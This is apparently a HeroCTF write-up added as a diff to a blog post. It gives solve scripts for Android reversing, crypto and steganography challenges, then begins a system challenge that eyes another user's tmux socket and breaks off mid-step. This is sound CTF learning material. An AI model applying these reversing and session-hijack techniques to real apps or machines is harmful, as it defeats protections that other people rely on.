@@ -8,4 +8,1600 @@ tags: [CTF]
 * TOC
 {:toc}
 
-- []()
+## Freeda Simple Hook (android)
+
+**Description**: Try to find the password to open this vault! Don't waste too much time statically analyzing the application; there are much faster ways.  
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Android
+
+**Author**: Thib
+
+My CPU does not support hardware virtualization and KVM is required for the Android emulator to run. This was a pain so I did static analysis which was also a pain.
+
+I used `apktool` to decompile the apk. I saw the function `get_flag()` in `Vault.smali`:
+```shell
+grep -R "flag" -n smali  
+smali/aa.smali:95: const-string v1, "Requested flags 0x"  
+smali/aa.smali:423: const-string v2, ", flags="  
+smali/androidx/recyclerview/widget/RecyclerView.smali:19624: const-string v1, "Called removeDetachedView with a view which is not flagged as tmp detached."  
+smali/c8.smali:246: const-string p1, "Good ! You can use this password as the flag."  
+smali/com/heroctf/freeda1/utils/Vault.smali:79:.method public static get_flag()Ljava/lang/String;  
+smali/ew.smali:8697: iget v5, v5, Landroid/content/pm/ApplicationInfo;->flags:I  
+smali/s3.smali:3526: const-string p1, "Must provide flag PRE or POST"
+```
+
+I looked at the file for a while:
+```shell
+cat smali/com/heroctf/freeda1/utils/Vault.smali  
+.class final Lcom/heroctf/freeda1/utils/Vault;  
+.super Ljava/lang/Object;  
+.source "r8-map-id-1a9af88ffb3dc84841cff9564d9f010c0ae775e01948d15ad9bf0acf206d5524"  
+  
+  
+# static fields  
+.field public static final a:[I  
+  
+  
+# direct methods  
+.method static constructor <clinit>()V  
+   .locals 1
+...
+```
+
+Solve script:
+```python
+import ctypes
+
+# original array
+a = [
+    0x34,0x58,0x1b,0x20,0x1b,0xba,0x60,0x6d,0x2d,0xca,
+    0x2a,0x7d,0x19,0x86,0x9f,0x45,0x2f,0x8e,0xc0,0xb8,
+    0x0d,0x13,0x8b,0xad,0x3b,0x81,0x00,0x9e,0xa5,0xbc,
+    0x0d,0x3e,0x4a,0xb8,0x3a,0x4b,0xac,0xca,0x42
+]
+
+# javas String.hashCode() in python
+def java_string_hashcode(s):
+    h = 0
+    for c in s:
+        h = (31 * h + ord(c)) & 0xFFFFFFFF
+    # Convert to signed int32
+    return ctypes.c_int32(h).value
+
+def seed():
+    s0 = "com.heroctf.freeda1.MainActivity"
+    s1 = "com.heroctf.freeda1.utils.CheckFlag"
+
+    v2 = ctypes.c_int32(-0x3f0011be).value
+    v0 = java_string_hashcode(s0) ^ v2
+    v0 ^= java_string_hashcode(s1)
+
+    rot = ((v0 << 7) | (v0 >> (32 - 7))) & 0xFFFFFFFF
+    v1 = ctypes.c_int32(rot * ctypes.c_int32(-0x61c88647).value).value
+
+    return ctypes.c_int32(v0 ^ v1).value
+
+def get_flag():
+    v0 = seed()
+    N = 0x27
+
+    v2 = list(range(N))
+
+    v4 = ctypes.c_int32(-0x5a5a5a5b).value ^ v0
+
+    for v5 in range(N-1, -1, -1):
+        v4 ^= (v4 << 13) & 0xFFFFFFFF
+        v4 ^= (v4 >> 17)
+        v4 ^= (v4 << 5) & 0xFFFFFFFF
+
+        idx = (v4 & 0xFFFFFFFF) % (v5 + 1)
+        v2[v5], v2[idx] = v2[idx], v2[v5]
+
+    out = bytearray()
+    for i in range(N):
+        v5b = a[v2[i]] & 0xFF
+        v5b = (v5b - i) & 0xFF
+
+        s = (v0 >> 27) & 0x7
+        v7 = v5b >> s
+        v6 = (8 - s)
+        v5b = ((v5b << v6) | v7) & 0xFF
+
+        shift = (i & 3) * 8
+        v6 = (v0 >> shift) & 0xFF
+
+        byte = v5b ^ v6
+        out.append(byte)
+
+    return out.decode("utf-8")
+
+if __name__ == "__main__":
+    print(get_flag())
+```
+Yeah they did not want this statically analyzed :( 
+
+`Hero{1_H0P3_Y0U_D1DN'T_S7A71C_4N4LYZ3D}`
+
+___
+
+## Freeda Not Root (android)
+
+**Description**: Try to find the password to open this vault! I was told that it was dangerous to let my application install on a rooted machine. I fixed the problem! Don't waste too much time statically analyzing the application; there are much faster ways.  
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Android
+
+**Author**: Thib
+
+I cant run the android emulator on my laptop so I did static analysis. Use `apktool` to decompile the apk:
+```shell
+apktool d app-release.apk -o decompiled_app  
+I: Using Apktool 2.12.0 on app-release.apk with 2 threads  
+I: Baksmaling classes.dex...  
+I: Loading resource table...  
+I: Decoding file-resources...  
+I: Loading resource table from file: /home/user/.local/share/apktool/framework/1.apk  
+I: Decoding values */* XMLs...  
+I: Decoding AndroidManifest.xml with resources...  
+I: Copying original files...  
+I: Copying assets...  
+I: Copying lib...  
+I: Copying unknown files...
+```
+
+Using `strings` I see `smali/com/heroctf/freeda2/utils/Vault.smali` has the `get_flag()` function:
+```shell
+grep -R "flag"  
+smali/a0/c.smali:    iget v5, v5, Landroid/content/pm/ApplicationInfo;->flags:I  
+smali/androidx/constraintlayout/widget/ConstraintLayout.smali:    iget v15, v15, Landroid/content/pm/ApplicationInfo;->flags:I  
+smali/androidx/constraintlayout/widget/ConstraintLayout.smali:    iget v1, v1, Landroid/content/pm/ApplicationInfo;->flags:I  
+smali/androidx/emoji2/text/p.smali:    const-string p1, "Must provide flag PRE or POST"  
+smali/androidx/recyclerview/widget/RecyclerView.smali:    const-string v1, "Called removeDetachedView with a view which is not flagged as tmp detached."  
+smali/com/google/android/material/datepicker/n.smali:    const-string p1, "Good ! You can use this password as the flag."  
+smali/com/heroctf/freeda2/utils/Vault.smali:.method public static get_flag()Ljava/lang/String;
+```
+
+The file is 1736 lines long:
+```shell
+cat smali/com/heroctf/freeda2/utils/Vault.smali | wc -l  
+1736
+```
+
+Solve script:
+```python
+import base64
+
+def vault_K():
+    return 0x5f9d7bc3
+
+def vault_E():
+    part1 = "fH6Da4rCaxDW/"
+    part2 = "lvs32vwcvJcmy" 
+    part3 = "9TgPQaLHfJuw=="
+    
+    builder = []
+    builder.extend(part1)
+    
+    builder.extend(part3)
+    
+    # Insert part2 at position len(part1)
+    result = builder[:len(part1)] + list(part2) + builder[len(part1):]
+    combined = ''.join(result)
+    
+    # Try decoding with standard base64 first
+    try:
+        decoded = base64.b64decode(combined)
+    except:
+        try:
+            import android_util_base64
+            decoded = android_util_base64.decode(combined, 0)
+        except:
+            decoded = base64.urlsafe_b64decode(combined + '=' * (4 - len(combined) % 4))
+    
+    int_array = [b & 0xFF for b in decoded]
+    return int_array
+
+def vault_X(x):
+    x = x & 0xFFFFFFFF
+    x ^= (x << 13) & 0xFFFFFFFF
+    x ^= (x >> 17) & 0xFFFFFFFF  
+    x ^= (x << 5) & 0xFFFFFFFF
+    return x & 0xFFFFFFFF
+
+def vault_P(length, seed):
+    arr = list(range(length))
+    
+    seed ^= 0xA5A5A5A5
+    n = length
+    
+    while n > 0:
+        seed = vault_X(seed)
+        index = (seed & 0xFFFFFFFF) % n
+        
+        # Swap elements
+        arr[n-1], arr[index] = arr[index], arr[n-1]
+        n -= 1
+        
+    return arr
+
+def vault_B(val):
+    b0 = val & 0xFF
+    b1 = (val >> 8) & 0xFF
+    b2 = (val >> 16) & 0xFF  
+    b3 = (val >> 24) & 0xFF
+    return [b0, b1, b2, b3]
+
+def get_flag():
+    # Step 1: Get the key and encrypted data
+    key = vault_K()
+    encrypted = vault_E()
+    length = len(encrypted)
+    
+    # Step 2: Create permutation
+    perm = vault_P(length, key)
+    
+    # Step 3: Get bytes from key
+    key_bytes = vault_B(key)
+    rotation = (key >> 27) & 0x7  # bits 27-29
+    
+    # Step 4: Decryption loop
+    result = [0] * length
+    
+    for i in range(length):
+        # Get encrypted byte through permutation
+        enc_byte = encrypted[perm[i]] & 0xFF
+        
+        # XOR with position
+        temp = i ^ enc_byte
+        
+        # Handle carry logic
+        if temp & 1 == 0:
+            enc_byte = (enc_byte + 0x100) & 0xFFFF
+            
+        # Subtract position
+        temp = (enc_byte - i) & 0xFF
+        
+        # Apply rotation
+        temp = ((temp >> rotation) | (temp << (8 - rotation))) & 0xFF
+        
+        # XOR with key byte
+        key_byte = key_bytes[i & 3] & 0xFF
+        temp ^= key_byte
+        
+        result[i] = temp & 0xFF
+    
+    # Convert to string
+    try:
+        flag = bytes(result).decode('utf-8')
+    except:
+        flag = bytes(result).decode('latin-1')
+        
+    return flag
+
+if __name__ == "__main__":
+    flag = get_flag()
+    print(f"Flag: {flag}")
+```
+
+`HERO{D1D_Y0U_U53_0BJ3C71ON?}`
+
+___
+
+## Freeda Native Hook (android)
+
+**Description**: Try to find the password to open this vault! I was told that it was dangerous to let my application install on a rooted machine. I fixed the problem! I was also told that it was safer to move sensitive functions from my code to a native library, so that's what I did! Don't waste too much time statically analyzing the application; there are much faster ways.  
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Android
+
+**Author**: Thib
+
+I cant emulate android devices so I did static analysis again. Use `apktool` to decompile the apk:
+```shell
+apktool d app-ctf.apk -o decompiled_app  
+I: Using Apktool 2.12.0 on app-ctf.apk with 2 threads  
+I: Baksmaling classes.dex...  
+I: Loading resource table...  
+I: Decoding file-resources...  
+I: Loading resource table from file: /home/user/.local/share/apktool/framework/1.apk  
+I: Decoding values */* XMLs...  
+I: Decoding AndroidManifest.xml with resources...  
+I: Copying original files...  
+I: Copying lib...  
+I: Copying unknown files...
+```
+
+I see as mentioned in the challenge description that the library files contain the function to get the flag:
+```shell
+grep -R get_flag  
+grep: lib/x86_64/libv3.so: binary file matches  
+grep: lib/x86/libv3.so: binary file matches  
+grep: lib/arm64-v8a/libv3.so: binary file matches
+
+strings libv3.so | grep flag  
+get_flag  
+Root detected - flag unavailable
+
+file libv3.so  
+libv3.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=b524f747dbae04516f0aeb10afdd6229b826daca, stripped
+```
+
+I opened `libv3.so` in ghidra. This is the function which builds the flag:
+```d
+void FUN_00102870(void)
+
+{
+  byte bVar1;
+  char cVar2;
+  char cVar3;
+  uint uVar4;
+  int iVar5;
+  long lVar6;
+  long lVar7;
+  byte bVar8;
+  long in_FS_OFFSET;
+  uint uStack_c;
+  long local_8;
+  
+  local_8 = *(long *)(in_FS_OFFSET + 0x28);
+  uVar4 = 0;
+LAB_00102f00:
+  iVar5 = uVar4 * 0x1d + 7;
+  iVar5 = iVar5 + (((uint)(iVar5 / 6 + (iVar5 >> 0x1f)) >> 3) - (iVar5 >> 0x1f)) * -0x30;
+  lVar7 = (long)(int)uVar4;
+  uStack_c = DAT_001054f8;
+  if (DAT_001054fc == '\0') {
+    uStack_c = 0x5f9d7bc3;
+  }
+  bVar8 = ~((&DAT_00100bc0)[iVar5] ^ (&DAT_00100bf0)[iVar5] ^
+           *(byte *)((long)&uStack_c + (ulong)(uVar4 & 3)));
+  bVar1 = (char)((int)uVar4 / 7) * -7 + (char)uVar4 + 1U & 7;
+  (&DAT_001054c0)[lVar7] = bVar8 >> bVar1 | bVar8 << 8 - bVar1;
+  do {
+    if (0x2e < (int)lVar7) {
+      uStack_c = CONCAT31((int3)(uStack_c >> 8),(char)lVar7) | 0x30;
+      uRam00000000001054f0 = 0;
+      if (*(long *)(in_FS_OFFSET + 0x28) == local_8) {
+        return;
+      }
+                    /* WARNING: Subroutine does not return */
+      __stack_chk_fail();
+    }
+    lVar6 = (long)(int)lVar7;
+    lVar7 = lVar6 + 1;
+    uVar4 = (uint)lVar7;
+    cVar3 = (char)lVar7;
+    cVar2 = (char)((ulong)lVar7 >> 0x18) >> 7;
+    switch(uVar4 & 7) {
+    case 0:
+      goto code_r0x00102efd;
+    case 1:
+      iVar5 = uVar4 * 0x1d + 7;
+      iVar5 = iVar5 + (((uint)(iVar5 / 6 + (iVar5 >> 0x1f)) >> 3) - (iVar5 >> 0x1f)) * -0x30;
+      uStack_c = 0x5f9d7bc3;
+      if (DAT_001054fc != '\0') {
+        uStack_c = DAT_001054f8;
+      }
+      bVar8 = ~((&DAT_00100bc0)[iVar5] ^ (&DAT_00100bf0)[iVar5] ^
+               *(byte *)((long)&uStack_c + (ulong)(uVar4 & 3)));
+      bVar1 = (((char)((int)uVar4 / 7) + cVar2) - (char)((long)(int)uVar4 * 0x92492493 >> 0x3f)) *
+              -7 + cVar3 + 1U & 7;
+      *(byte *)(lVar6 + 0x1054c1) = bVar8 >> bVar1 | bVar8 << 8 - bVar1;
+      break;
+    case 2:
+      iVar5 = uVar4 * 0x1d + 7;
+      iVar5 = iVar5 + (((uint)(iVar5 / 6 + (iVar5 >> 0x1f)) >> 3) - (iVar5 >> 0x1f)) * -0x30;
+      uStack_c = 0x5f9d7bc3;
+      if (DAT_001054fc != '\0') {
+        uStack_c = DAT_001054f8;
+      }
+      bVar8 = ~((&DAT_00100bc0)[iVar5] ^ (&DAT_00100bf0)[iVar5] ^
+               *(byte *)((long)&uStack_c + (ulong)(uVar4 & 3)));
+      bVar1 = (((char)((int)uVar4 / 7) + cVar2) - (char)((long)(int)uVar4 * 0x92492493 >> 0x3f)) *
+              -7 + cVar3 + 1U & 7;
+      *(byte *)(lVar6 + 0x1054c1) = bVar8 >> bVar1 | bVar8 << 8 - bVar1;
+      break;
+    case 3:
+      iVar5 = uVar4 * 0x1d + 7;
+      iVar5 = iVar5 + (((uint)(iVar5 / 6 + (iVar5 >> 0x1f)) >> 3) - (iVar5 >> 0x1f)) * -0x30;
+      uStack_c = 0x5f9d7bc3;
+      if (DAT_001054fc != '\0') {
+        uStack_c = DAT_001054f8;
+      }
+      bVar8 = ~((&DAT_00100bc0)[iVar5] ^ (&DAT_00100bf0)[iVar5] ^
+               *(byte *)((long)&uStack_c + (ulong)(uVar4 & 3)));
+      bVar1 = (((char)((int)uVar4 / 7) + cVar2) - (char)((long)(int)uVar4 * 0x92492493 >> 0x3f)) *
+              -7 + cVar3 + 1U & 7;
+      *(byte *)(lVar6 + 0x1054c1) = bVar8 >> bVar1 | bVar8 << 8 - bVar1;
+      break;
+    case 4:
+      iVar5 = uVar4 * 0x1d + 7;
+      iVar5 = iVar5 + (((uint)(iVar5 / 6 + (iVar5 >> 0x1f)) >> 3) - (iVar5 >> 0x1f)) * -0x30;
+      uStack_c = 0x5f9d7bc3;
+      if (DAT_001054fc != '\0') {
+        uStack_c = DAT_001054f8;
+      }
+      bVar8 = ~((&DAT_00100bc0)[iVar5] ^ (&DAT_00100bf0)[iVar5] ^
+               *(byte *)((long)&uStack_c + (ulong)(uVar4 & 3)));
+      bVar1 = (((char)((int)uVar4 / 7) + cVar2) - (char)((long)(int)uVar4 * 0x92492493 >> 0x3f)) *
+              -7 + cVar3 + 1U & 7;
+      *(byte *)(lVar6 + 0x1054c1) = bVar8 >> bVar1 | bVar8 << 8 - bVar1;
+      break;
+    case 5:
+      iVar5 = uVar4 * 0x1d + 7;
+      iVar5 = iVar5 + (((uint)(iVar5 / 6 + (iVar5 >> 0x1f)) >> 3) - (iVar5 >> 0x1f)) * -0x30;
+      uStack_c = 0x5f9d7bc3;
+      if (DAT_001054fc != '\0') {
+        uStack_c = DAT_001054f8;
+      }
+      bVar8 = ~((&DAT_00100bc0)[iVar5] ^ (&DAT_00100bf0)[iVar5] ^
+               *(byte *)((long)&uStack_c + (ulong)(uVar4 & 3)));
+      bVar1 = (((char)((int)uVar4 / 7) + cVar2) - (char)((long)(int)uVar4 * 0x92492493 >> 0x3f)) *
+              -7 + cVar3 + 1U & 7;
+      *(byte *)(lVar6 + 0x1054c1) = bVar8 >> bVar1 | bVar8 << 8 - bVar1;
+      break;
+    case 6:
+      iVar5 = uVar4 * 0x1d + 7;
+      iVar5 = iVar5 + (((uint)(iVar5 / 6 + (iVar5 >> 0x1f)) >> 3) - (iVar5 >> 0x1f)) * -0x30;
+      uStack_c = 0x5f9d7bc3;
+      if (DAT_001054fc != '\0') {
+        uStack_c = DAT_001054f8;
+      }
+      bVar8 = ~((&DAT_00100bc0)[iVar5] ^ (&DAT_00100bf0)[iVar5] ^
+               *(byte *)((long)&uStack_c + (ulong)(uVar4 & 3)));
+      bVar1 = (((char)((int)uVar4 / 7) + cVar2) - (char)((long)(int)uVar4 * 0x92492493 >> 0x3f)) *
+              -7 + cVar3 + 1U & 7;
+      *(byte *)(lVar6 + 0x1054c1) = bVar8 >> bVar1 | bVar8 << 8 - bVar1;
+      break;
+    default:
+      iVar5 = uVar4 * 0x1d + 7;
+      iVar5 = iVar5 + (((uint)(iVar5 / 6 + (iVar5 >> 0x1f)) >> 3) - (iVar5 >> 0x1f)) * -0x30;
+      uStack_c = 0x5f9d7bc3;
+      if (DAT_001054fc != '\0') {
+        uStack_c = DAT_001054f8;
+      }
+      bVar8 = ~((&DAT_00100bc0)[iVar5] ^ (&DAT_00100bf0)[iVar5] ^
+               *(byte *)((long)&uStack_c + (ulong)(uVar4 & 3)));
+      bVar1 = (((char)((int)uVar4 / 7) + cVar2) - (char)((long)(int)uVar4 * 0x92492493 >> 0x3f)) *
+              -7 + cVar3 + 1U & 7;
+      *(byte *)(lVar6 + 0x1054c1) = bVar8 >> bVar1 | bVar8 << 8 - bVar1;
+    }
+  } while( true );
+code_r0x00102efd:
+  goto LAB_00102f00;
+}
+```
+
+Looking at `.rodata`:
+```shell
+readelf -x .rodata libv3.so  
+  
+Hex dump of section '.rodata':  
+ 0x000009d0 23140000 bf150000 9e140000 3b150000 #...........;...  
+ 0x000009e0 d5130000 22160000 6b160000 14250000 ...."...k....%..  
+ 0x000009f0 c41e0000 fe250000 21260000 01250000 .....%..!&...%..  
+ 0x00000a00 e11e0000 a1200000 81210000 c11f0000 ..... ...!......  
+ 0x00000a10 41230000 21240000 00000000 00000000 A#..!$..........  
+ 0x00000a20 526f6f74 20646574 65637465 64202d20 Root detected -    
+ 0x00000a30 666c6167 20756e61 7661696c 61626c65 flag unavailable  
+ 0x00000a40 002f7379 7374656d 2f62696e 2f627573 ./system/bin/bus  
+ 0x00000a50 79626f78 00726f2e 64656275 67676162 ybox.ro.debuggab  
+ 0x00000a60 6c650075 73657264 65627567 002f7072 le.userdebug./pr  
+ 0x00000a70 6f632f73 656c662f 73746174 7573002f oc/self/status./  
+ 0x00000a80 70726f63 2f73656c 662f6d61 7073002f proc/self/maps./  
+ 0x00000a90 73797374 656d2f62 696e2f73 75007465 system/bin/su.te  
+ 0x00000aa0 73742d6b 65797300 726f2e62 75696c64 st-keys.ro.build  
+ 0x00000ab0 2e747970 65007375 00656e67 002f7362 .type.su.eng./sb  
+ 0x00000ac0 696e2f73 75002f73 79737465 6d2f7862 in/su./system/xb  
+ 0x00000ad0 696e2f73 75002f73 79737465 6d2f6269 in/su./system/bi  
+ 0x00000ae0 6e2f2e65 78742f2e 7375002f 73797374 n/.ext/.su./syst  
+ 0x00000af0 656d2f78 62696e2f 62757379 626f7800 em/xbin/busybox.  
+ 0x00000b00 2f736269 6e2f2e6d 61676973 6b00726f /sbin/.magisk.ro  
+ 0x00000b10 2e627569 6c642e74 61677300 726f2e73 .build.tags.ro.s  
+ 0x00000b20 65637572 65002f70 726f632f 73656c66 ecure./proc/self  
+ 0x00000b30 2f6d6f75 6e747300 2f76656e 646f722f /mounts./vendor/  
+ 0x00000b40 62696e2f 7375002f 73797374 656d2f78 bin/su./system/x  
+ 0x00000b50 62696e2f 6461656d 6f6e7375 002f7379 bin/daemonsu./sy  
+ 0x00000b60 732f6673 2f73656c 696e7578 2f656e66 s/fs/selinux/enf  
+ 0x00000b70 6f726365 002f6461 74612f61 64622f6d orce./data/adb/m  
+ 0x00000b80 61676973 6b002f64 6174612f 6164622f agisk./data/adb/  
+ 0x00000b90 6d6f6475 6c657300 2f646174 612f6164 modules./data/ad  
+ 0x00000ba0 622f6b73 75002f73 752f6269 6e2f7375 b/ksu./su/bin/su  
+ 0x00000bb0 00000000 00000000 00000000 00000000 ................  
+ 0x00000bc0 171105b3 c142d01e 387c6b4e 227590a3 .....B..8|kN"u..  
+ 0x00000bd0 380fcd84 acf287ad c178f91d 926b994f 8........x...k.O  
+ 0x00000be0 81c105b2 f16d693a dbc3be34 0fc8611f .....mi:...4..a.  
+ 0x00000bf0 31d91f31 891339b2 2debb6d7 af6d5692 1..1..9.-....mV.  
+ 0x00000c00 affef175 2b508cdb ec92064e 74a9ee86 ...u+P.....Nt...  
+ 0x00000c10 54884e0f e0976fcc c3adeb41 ac223726 T.N...o....A."7&
+```
+
+Solve script:
+```python
+import struct
+
+# data from .rodata section
+data_bc0 = bytes.fromhex("171105b3c142d01e387c6b4e227590a3380fcd84acf287adc178f91d926b994f81c105b2f16d693adbc3be340fc8611f")
+data_bf0 = bytes.fromhex("31d91f31891339b22debb6d7af6d5692affef1752b508cdbec92064e74a9ee8654884e0fe0976fccc3adeb41ac223726")
+
+# constants from the decompilation
+DAT_001054f8 = 0x5f9d7bc3
+flag_length = 48
+
+def reconstruct_flag():
+    flag_bytes = bytearray(flag_length)
+    
+    for i in range(flag_length):
+        # calculate index for data arrays
+        temp = i * 0x1d + 7
+        temp = temp + (((temp // 6 + (temp >> 0x1f)) >> 3) - (temp >> 0x1f)) * -0x30
+        idx = temp
+        
+        # get bytes from data arrays
+        byte_bc0 = data_bc0[idx % len(data_bc0)]
+        byte_bf0 = data_bf0[idx % len(data_bf0)]
+        
+        # XOR with key byte
+        key_byte = DAT_001054f8.to_bytes(4, 'little')[i & 3]
+        obfuscated = ~(byte_bc0 ^ byte_bf0 ^ key_byte) & 0xFF
+        
+        # bit rotation
+        rotation = ((i // 7) * -7 + i + 1) & 7
+        flag_byte = ((obfuscated >> rotation) | (obfuscated << (8 - rotation))) & 0xFF
+        
+        flag_bytes[i] = flag_byte
+    
+    return flag_bytes
+
+# reconstruct and print the flag
+flag_bytes = reconstruct_flag()
+flag = flag_bytes.decode('ascii', errors='ignore')
+print(f"Flag: {flag}")
+```
+
+Output:
+```shell
+python3 solve8.py  
+Flag: Hero{F1NAL_57EP_Y0U_KN0W_H0W_TO_R3V3R53_4NDR01D}
+```
+
+`Hero{F1NAL_57EP_Y0U_KN0W_H0W_TO_R3V3R53_4NDR01D}`
+
+___
+
+## Andor (crypto)
+
+**Description**: Would you rather be inside solving challenges AND getting flags OR outside touching grass? TCP: `nc crypto.heroctf.fr 9000`  
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Crypto
+
+**Author**: Alol
+
+I get the challenge file:
+```shell
+cat chall.py  
+#!/usr/bin/env python3  
+import secrets  
+  
+AND = lambda x, y: [a & b for a, b in zip(x, y)]  
+IOR = lambda x, y: [a | b for a, b in zip(x, y)]  
+  
+with open("flag.txt", "rb") as f:  
+   flag = [*f.read().strip()]  
+   l = len(flag) // 2  
+  
+while True:  
+   k = secrets.token_bytes(len(flag))  
+   a = AND(flag[:l], k[:l])  
+   o = IOR(flag[l:], k[l:])  
+  
+   print("a =", bytearray(a).hex())  
+   print("o =", bytearray(o).hex())  
+   input("> ")
+```
+
+When I connect:
+```shell
+nc crypto.heroctf.fr 9000  
+a = 4024306f4901001440246664143508301210470072031930515800282047  
+o = eb72677fb7377fb771fdf5fdb57fe7eebde75ffcef6d7f79b7b56e77f77f  
+>
+```
+
+The server splits the flag in half and generates a random key `k` of the same length. Then the server sends:
+```shell
+a = Left & k
+o = Right | k
+```
+In the left half, `1 & 1 = 1`, anything else = 0. So any 1 in a is a definite 1 in the flag.
+
+In the right half, `0 | 0 = 0`, anything else = 1. So any `0` in is a definite `0` in the flag.
+
+Solve script:
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+L = None
+R = None
+
+p = remote("crypto.heroctf.fr", 9000)
+
+while True:
+    p.recvuntil(b"a = ")
+    a = bytes.fromhex(p.recvline().strip().decode())
+
+    p.recvuntil(b"o = ")
+    o = bytes.fromhex(p.recvline().strip().decode())
+
+    if L is None:
+        L = bytearray(a)
+        R = bytearray(o)
+    else:
+        for i in range(len(a)):
+            L[i] |= a[i]
+            R[i] &= o[i]
+
+    flag = bytes(L + R)
+    try:
+        s = flag.decode()
+        if s.startswith("Hero{") and s.endswith("}"):
+            print("FLAG:", s)
+            break
+    except:
+        pass
+
+    p.sendline(b"x")
+```
+
+`Hero{y0u_4nd_5l33p_0r_y0u_4nd_c0ff33_3qu4l5_fl4g_4nd_p01n75}`
+
+___
+
+## Perilous (crypto)
+
+**Description**: I've made a RC4 encryption service and I want you to test its security. Decryption isn't supported though :p TCP: `nc crypto.heroctf.fr 9001`
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Crypto
+
+**Author**: Alol
+
+I get the challenge file:
+```python
+#!/usr/bin/env python3  
+from cryptography.hazmat.decrepit.ciphers import algorithms  
+from cryptography.hazmat.primitives.ciphers import Cipher  
+import os  
+  
+with open("flag.txt", "rb") as f:  
+    FLAG = f.read()  
+  
+MASK = os.urandom(len(FLAG))  
+KEYS = []  
+  
+  
+def xor(a: bytes, b: bytes) -> bytes:  
+    return bytes(x ^ y for x, y in zip(a, b * (1 + len(a) // len(b))))  
+  
+  
+def encrypt(k: str, m: str) -> str:  
+    k = bytes.fromhex(k)  
+    m = bytes.fromhex(m)  
+  
+    if k in KEYS:  
+        raise Exception("Duplicate key used, aborting")  
+  
+    KEYS.append(k)  
+  
+    algorithm = algorithms.ARC4(k)  
+    cipher = Cipher(algorithm, mode=None)  
+    encryptor = cipher.encryptor()  
+  
+    m = xor(m, MASK)  
+    m = encryptor.update(m)  
+    m = xor(m, MASK)  
+    return m.hex()  
+  
+  
+print(  
+    "Welcome to my RC4 encryption service! Some may call it deprecated, I call it vintage.",  
+)  
+  
+k = input("flag k: ")  
+print(encrypt(k, FLAG.hex()))  
+  
+while True:  
+    k = input("k: ")  
+    m = input("m: ")  
+    print(encrypt(k, m))
+```
+The server in encrypting the flag with a stream cipher, but the value is XORed before and after, which cancels it out. 
+
+I connect to the server and give it any valid hex:
+```shell
+nc crypto.heroctf.fr 9001  
+Welcome to my RC4 encryption service! Some may call it deprecated, I call it vintage.  
+flag k: 1111111111111111  
+c4ee7d7807c1ee707e2ac57b41535edf18984031d0edf3d793dcfe45d44462862f76498c59dc
+```
+
+Solve script:
+```python
+#!/usr/bin/env python3
+from cryptography.hazmat.decrepit.ciphers import algorithms
+from cryptography.hazmat.primitives.ciphers import Cipher
+import binascii
+
+KEY = binascii.unhexlify("1111111111111111")
+C = binascii.unhexlify("c4ee7d7807c1ee707e2ac57b41535edf18984031d0edf3d793dcfe45d44462862f76498c59dc")
+
+algorithm = algorithms.ARC4(KEY)
+cipher = Cipher(algorithm, mode=None)
+decryptor = cipher.decryptor()
+
+flag = decryptor.update(C)
+print(flag)
+```
+
+`Hero{7h3_p3r1l5_0f_r3p3471n6_p4773rn5}`
+
+___
+
+## LSD#4 (steganography)
+
+**Description**: Babe wakup, LSD#4 is out now! Don't try to throw random tools at this poor image. Go back to the basics and learn the detection techniques. Good luck! (Little hint : The square measures 100x100 and starts at coordinates 1000:1000)  
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Steganography
+
+**Author**: Thib
+
+I get the challenge file:
+
+![Alt text](/images/secret.png)
+
+Solve script:
+```python
+from PIL import Image
+import zlib
+import base64
+
+img = Image.open("secret.png")
+pixels = img.load()
+
+bits = []
+
+for y in range(1000, 1100):
+    for x in range(1000, 1100):
+        r, g, b = pixels[x, y]
+        bits.append(r & 1)
+
+data = bytearray()
+for i in range(0, len(bits), 8):
+    byte = 0
+    for bit in bits[i:i+8]:
+        byte = (byte << 1) | bit
+    data.append(byte)
+
+print("Raw bytes:")
+print(data)
+```
+
+It looks at the coordinates hinted at in the challenge description and extracts the LSB from the red channel only. Solve script output:
+```shell
+python3 extract.py  
+Raw bytes:  
+bytearray(b'Steganography is the practice of concealing information. It involves hiding data within an ordinary, non-secret file or message to prevent detection. The hidden in formation is being extracted at the receiving end. Often, steganography is combined with encryption to add an extra layer of security for the hidden data. With the help of Steganography, we can hide any digital content virtually like text, image, videotape, etc.\n\nThe term "steganography" is derived from the Greek word "steganos" which means "hidden or covered" and "graph" means "to write." It has been in use for centuries. For example, in ancient Greece, people carved messages onto wood and covered them with wax to hide it. Similarly, Romans used different types of invisible inks which could be revealed when exposed to heat or light. Here is your flag: Hero{M4YB3_TH3_L4ST_LSB?}\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\...
+```
+
+`Hero{M4YB3_TH3_L4ST_LSB?}`
+
+___
+
+## Movie Night #1 (system)
+
+**Description**: _Dallas_: Something has attached itself to him. We have to get him to the infirmary right away. _Ripley_: What kind of thing? I need a clear definition.  
+- _**Alien (1979)**_ 
+The flag for this challenge is located at `/home/dev/flag.txt`. Your credentials are: `user:password`.  
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: System
+
+**Author**: Log_s
+
+I connect to the challenge instance: `ssh -p 12305 user@dyn04.heroctf.fr`
+
+I look at the running processes and see `dev` has a `tmux` session open:
+```shell
+user@movie_night:~$ ps aux    
+USER     PID %CPU %MEM   VSZ   RSS TTY STAT START TIME COMMAND  
+root       1  0.0  0.0  3932  3056 ?   Ss   00:55 0:00 /bin/bash /root/start.sh  
+message+  11  0.0  0.0  9140  2648 ?   Ss   00:55 0:00 dbus-daemon --system --fork  
+root      19  0.0  0.2 30564 19832 ?   S    00:55 0:00 /usr/bin/python3 /opt/procservice/procedure-processing-service.py  
+root      21  0.0  0.0  3932  3024 ?   S    00:56 0:00 /bin/bash /root/monitor_wrapper.sh  
+root      24 21.0  0.0  2468  1588 ?   S    00:56 2:19 /root/process_monitor
+dev       31  0.0  0.0  4548  3148 ?   Ss   00:56 0:00 tmux -S /tmp/tmux-1002 new-session -d -s work bash
+...
+```
+
+I confirm I can access this socket:
+```shell
+user@movie_night:~$ ls -l /tmp/tmux-1002  
